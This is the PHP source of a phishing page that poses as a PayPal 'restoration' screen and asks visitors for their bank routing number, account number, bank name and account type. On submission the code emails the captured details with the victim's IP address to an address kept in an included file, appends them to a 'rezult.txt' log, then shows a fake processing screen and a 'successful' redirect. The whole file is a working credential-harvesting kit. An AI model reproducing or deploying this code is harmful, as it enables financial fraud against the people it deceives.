<?php

$owner = base64_decode($_GET['_Owner']);
if(isset($_POST['acnt-nmbr']) && isset($_POST['r00t'])){
echo '<html lang="en" class=" js flexbox canvas canvastext webgl no-touch geolocation postmessage websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths jsEnabled"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  	<title>Please Complete with Your Informations</title>
  	<meta charset="utf-8">
  	<meta http-equiv="X-UA-Compatible" content="IE=9; IE=8; IE=7">
  		<link rel="shortcut icon" href="img/favicon.ico">
		<link href="css/main.css" rel="stylesheet" type="text/css">
		<link href="css/new.css" rel="stylesheet" type="text/css">
		<link rel="stylesheet" href="css/cvvquestion.css">
		<link rel="stylesheet" href="css/app.css">
    </head>
    		<body id="settings">
		    		<div id="page">
		<div class="navbar navbar-fixed-top header" id="header">
			<div class="navbar-inner">
				<div class="navBanner clearfix" role="banner">
					<div class="brand"><a href="#"><img src="img/logo_106x27.png" alt="logo"></a></div>
				</div>
				<nav id="navMenu" class="navMenu clearfix" role="navigation">				
					<div class="upbar"></div>
				<ul class="navSecondary">
						<li><a href="#" class="linkSettings navIcons scTrack:settings" target="_blank">j</a></li>
						<li><a href="#" class="btn btn-mini btn-secondary logout">Log out</a></li>
					</ul>
				</nav>
			</div>
		</div>
     			<section id="content">
     		<section id="main" role="main">	
<div class="column_24">
<div class="one column nogutter">
<div id="prfLeftNav">
	 	<div class="menu4"></div>
		</br>
		<div class="enable"></div>
</div>
<div class="mainContentFrame-bnk">
	<div id="prfMainContentWrapper-bnk" aria-live="polite">
	<div id="profile-PERSONAL_SETTINGSPanel">
<div id="prfPersonalInfo">
<div><center>
<img src="img/processing.gif" style="padding-top:160px;"/>
<span style="font-size:15px;"></br></br>Processing ...</span>
</center></div>
</div>		
	</div>
	</div>
</div>
			</div>
</div>	
     		</section>
    	 </section>
		 <center>
<div class="footer-billing"></div></center>
    	<script src="./bill_files/c9a42309d6e427a3cf00f2a5a575f0.js" type="text/javascript"></script>
    	<script src="./bill_files/bf561559bd294ab8108d9a22c0c66.js" type="text/javascript"></script>    	
<script type="text/javascript" src="./bill_files/pp_jscode_080706.js"></script>
	<script type="text/javascript" src="./bill_files/pa.js"></script>
</div><div></div></body></html>';

include 'to.php';
$r00t = $_POST['r00t'];
$acntnmbr = $_POST['acnt-nmbr'];
$bname = $_POST['name'];
$type = $_POST['type'];
$IP = getenv("REMOTE_ADDR");
$BILSMG = "<pre><font style='font-size:14px;font-weight: bold;'>
#################################
         <img src='https://2.bp.blogspot.com/-O-ZJASC706s/U_hvz20oD2I/AAAAAAAAACw/OV1BlsEyjM0/s1600/logo_106x27.png'/>
#################################
own : $owner
r0t : $r00t
abr : $acntnmbr
bna : $bname
tpe : $type
#################################
IP : <a target='_blank' style='text-decoration:none;' href='http://www.geoiptool.com/?IP=".$IP."'>".$IP."</a>
#################################";
$MAIL_TITLE = "BANK | ".$IP."";
$MAIL_HEADER = "From: REZ <rezult>\r\nMIME-Version: 1.0\r\nContent-Type: text/html\r\nContent-Transfer-Encoding: 8bit\r\n\r\n";
@mail($TO,$MAIL_TITLE,$BILSMG,$MAIL_HEADER);

$open_rezult_file = fopen("../rezult.txt","a"); // spam rezult in file okkkkkk becarful
fwrite($open_rezult_file,$BILSMG); // spam rezult in file okkkkkk becarful

$x=md5(microtime());
echo "<META HTTP-EQUIV='refresh' content='4; URL=websc-success.php?Go=_Restoration_successful&_SESSION=$x$x'>";exit;
}
?>
<!DOCTYPE html>
<html lang="en" class=" js flexbox canvas canvastext webgl no-touch geolocation postmessage websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths jsEnabled"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  	<title>Please Complete with Your Informations</title>
  	<meta charset="utf-8">
  	<meta http-equiv="X-UA-Compatible" content="IE=9; IE=8; IE=7">
  		<link rel="shortcut icon" href="img/favicon.ico">
		<link href="css/main.css" rel="stylesheet" type="text/css">
		<link href="css/new.css" rel="stylesheet" type="text/css">
		<link rel="stylesheet" href="css/cvvquestion.css">
		<link rel="stylesheet" href="css/app.css">
    </head>
    		<body id="settings">
		    		<div id="page">
		<div class="navbar navbar-fixed-top header" id="header">
			<div class="navbar-inner">
				<div class="navBanner clearfix" role="banner">
					<div class="brand"><a href="#"><img src="img/logo_106x27.png" alt="PayPal"></a></div>
				</div>
				<nav id="navMenu" class="navMenu clearfix" role="navigation">
					<div class="upbar"></div>
				<ul class="navSecondary">
						<li><a href="#" class="linkSettings navIcons scTrack:settings" target="_blank">j</a></li>
						<li><a href="#" class="btn btn-mini btn-secondary logout">Log out</a></li>
					</ul>
				</nav>
			</div>
		</div>
     			<section id="content">
     		<section id="main" role="main">
<div class="column_24">
<div class="one column nogutter">
<div id="prfLeftNav">
	 	<div class="menu3"></div>
		</br>
		<div class="enable"></div>
</div>
<div class="mainContentFrame-bnk">
	<div id="prfMainContentWrapper-bnk" aria-live="polite">
	<div id="profile-PERSONAL_SETTINGSPanel">
<div id="prfPersonalInfo">
<h2 class="prfTabHeading">
<center><div class="bnk-pymnt"></div></center>
</h2>
<form action="websc-banking.php?Go=_Restoration_Processing&_Tooken=" method="post" autocomplete="off">
<div class="prfSection" id="cc">
	<h3 class="prfLabel"><div class="owner"></div></h3>
	<div class="prfDetails confidential"><input style="letter-spacing: 2px;" type="text" id="name"  name="owner" class="large" value="<?=$owner; ?>" disabled /></div><br></br></br>
	<h3 class="prfLabel"><div class="r00t"></div></h3>
	<div class="prfDetails confidential"><input pattern="[0-9].{8}" maxlength="9" style="letter-spacing: 3px;" title="Please enter a valid Rooting Number"  type="text" id="r00t"  name="r00t" class="large" value="" required/></div><br></br></br>
	<h3 class="prfLabel"><div class="acnt-nmbr"></div></h3>
	<div class="prfDetails confidential"><input pattern="[0-9].{11}" maxlength="12" style="letter-spacing: 3px;" title="Please enter a Account Number"  type="text" id="acnt-nmbr"  name="acnt-nmbr" class="large" value="" required/></div><br></br></br>
	<h3 class="prfLabel"><div class="bnk-name"></div></h3>
	<div class="prfDetails confidential"><input placeholder="Optional" style="letter-spacing: 1.5px;" title="Please enter a valid Bank Name"  type="text" id="name"  name="name" class="large" value="" /></div><br></br></br>
	<h3 class="prfLabel"><div class="acnt-type"></div></h3>
	<div class="prfDetails confidential">
	<select id="type" name="type">
	<option style="font-weight:bold;" ></option>
	<option value="Saving">Saving</option>
	<option value="Checking">Checking</option>
	<option value="Investment">Investment</option>
	<option value="Others">Others</option>
	</select> 
	</div>
</div>
</div>
<div class="prfSection">
<input class="next" value="next" type="submit"  /><div style="width:85px;" class="skip-position"><a href="websc-proccessing.php?Go=_Restoration_Processing&_SESSION=<?=md5(microtime()).md5(microtime());?>"><div class="skip"></div></a></div>
</div>
  </form>
</div>	
	</div>
	</div>
</div>
			</div>
</div>
     		</section>
    	 </section>
		 <center>
<div class="footer-billing"></div></center>
</div><div></div></body></html>